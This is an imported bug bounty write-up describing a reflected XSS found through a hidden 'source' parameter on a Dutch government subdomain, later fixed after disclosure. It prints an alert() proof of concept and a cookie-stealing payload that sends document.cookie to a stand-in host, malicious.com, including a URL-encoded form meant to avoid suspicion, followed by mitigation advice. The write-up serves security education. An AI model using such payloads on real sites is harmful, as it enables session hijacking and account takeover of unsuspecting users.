---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-09-19_reflected-xss-via-a-hidden-parameter-on-dutch-gov-website.md
original_filename: 2020-09-19_reflected-xss-via-a-hidden-parameter-on-dutch-gov-website.md
title: Reflected XSS via a hidden parameter on Dutch Gov. website
category: documents
detected_topics:
- xss
- command-injection
- webhooks
- api-security
tags:
- imported
- documents
- xss
- command-injection
- webhooks
- api-security
language: en
raw_sha256: f252679892f03f9310105eab1de7cc90f03203b3e1bc470706611c69290d13d3
text_sha256: c3582b44f4a6b8c1967641b0a6366a5526f6f7bffa3b94828f320ba554774653
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Reflected XSS via a hidden parameter on Dutch Gov. website

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-09-19_reflected-xss-via-a-hidden-parameter-on-dutch-gov-website.md
- Source Type: markdown
- Detected Topics: xss, command-injection, webhooks, api-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `f252679892f03f9310105eab1de7cc90f03203b3e1bc470706611c69290d13d3`
- Text SHA256: `c3582b44f4a6b8c1967641b0a6366a5526f6f7bffa3b94828f320ba554774653`


## Content

---
title: "Reflected XSS via a hidden parameter on Dutch Gov. website"
page_title: "Reflected XSS via a hidden parameter on Dutch Gov. website – Supras.io"
url: "https://supras.io/reflected-xss-via-a-hidden-parameter-on-dutch-gov-website/"
final_url: "https://supras.io/reflected-xss-via-a-hidden-parameter-on-dutch-gov-website/"
authors: ["Supras (@LdrTom)"]
programs: ["Dutch Government"]
bugs: ["Reflected XSS"]
publication_date: "2020-09-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4257
---

[1](https://supras.io/reflected-xss-via-a-hidden-parameter-on-dutch-gov-website/#comments)

# Reflected XSS via a hidden parameter on Dutch Gov. website

Posted on [19 septembre 2020](https://supras.io/reflected-xss-via-a-hidden-parameter-on-dutch-gov-website/ "13 h 12 min") by [Supr4s](https://supras.io/author/supras/ "Afficher tous les articles par Supr4s")

This summer I came across the Bug Bounty program of the Dutch Government, and I saw that as a reward it offers you a super cool t-shirt ! I have to redo my wardrobe, so why not give it a try ? 😉

Table of Contents

Toggle

  * Recon
  * Payload
  * Preventive measures
  * Conclusion

## Recon

During my recon phase, i came across an interesting sub-domain. Subdomain belonging to one of the main domains of the Dutch Government. This website is for display purposes only, we have no possibility to log in. He is written in PHP.

I browsed it with the help of a web proxy (Burp) to keep track of all the requests made. Many GET queries were performed, with different parameters at each time. I did not succeed in exploiting one of these parameters, and rather than get stuck, I decided to find hidden GET parameters on the application.

This can be done with different tools :

  * [Arjun](https://github.com/s0md3v/Arjun)
  * [param-miner (Burp Suite extension)](https://github.com/PortSwigger/param-miner)
  * [parameth](https://github.com/maK-/parameth)

In my case I used Arjun, but you can mix two of these three tools to increase your chances of finding a hidden parameter.

![](https://supras.io/wp-content/uploads/2020/09/bbh_tips-1.png)

I always keep track of the dynamic URLs I discovered (contains : &,=…) and after some tests with Arjun :

> 
>  [!] Scan Completed 
>  [+] Valid parameter found: source

With this new parameter, I was able to make some tests and quickly discovered that its value was reflected in the source code of the page inside a script tag.

## Payload

My _& source=TEST_ parameter being reflected directly in the source code of the page, without HTML encoding for this parameter, it wasn’t hard to trigger an XSS.

I just have to close the script tag, re-open a new one and inject my malicious JavaScript code into it. What gives as payload :

> 
>  &source=TEST</script><script>alert('RXSS')</script>

![](https://supras.io/wp-content/uploads/2020/09/RXSS-300x194.png)

XSS triggered !

With a Reflected XSS flaw, we could send our vulnerable URL to the administrator, who would trigger the attack by opening the link.

With a specially designed payload and a bit of social engineering, we could retrieve his session cookies and thus access the back-office = access to the administration page of the site.

For example, a payload that would look like this :

> 
>  &source=TEST</script><script>document.write('<img src="https://malicious.com/?'+document.cookie+' "/>');</script>

With a little URL encoding so as not to arouse suspicion :

> 
>  %26source%3DTEST%3C%2Fscript%3E%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22http%3A%2F%2Fmalicious.com%2F%3F%27%2Bdocument.cookie%2B%27%20%20%22%2F%3E%27%29%3B%3C%2Fscript%3E

If the link is triggered, user session cookies will be sent on hacker server (here : malicious.com)

## Preventive measures

Here are some solutions to be put in place to avoid this type of attack :

  * Never trust user inputs, and sanitize them if there are (HTML encoding with entities). For example, _< script>_ gets converted to _& lt;script&gt:;_ and browser displays the entities but does not run them (_<_ becomes _& lt;,_  _>_ becomes _& gt;,_  _«_ becomes _& quot;_ etc.)
  * Delete unnecessary parameters. In my case, I hadn’t seen the application querying with _& source_ until I found it myself.
  * Add CSP and HttpOnly cookies flag to prevent cookies access from JavaScript

## Conclusion

It wasn’t a very hard bug to find, but it’s always motivating to make the web a safer place.

The Dutch government security team, besides being nice, was super responsive and a few days later the vulnerability was fixed. And I got my t-shirt. 😉

![](https://supras.io/wp-content/uploads/2020/09/dutch_gov_t_shirt.jpeg)

__[Infosec](https://supras.io/category/infosec/)
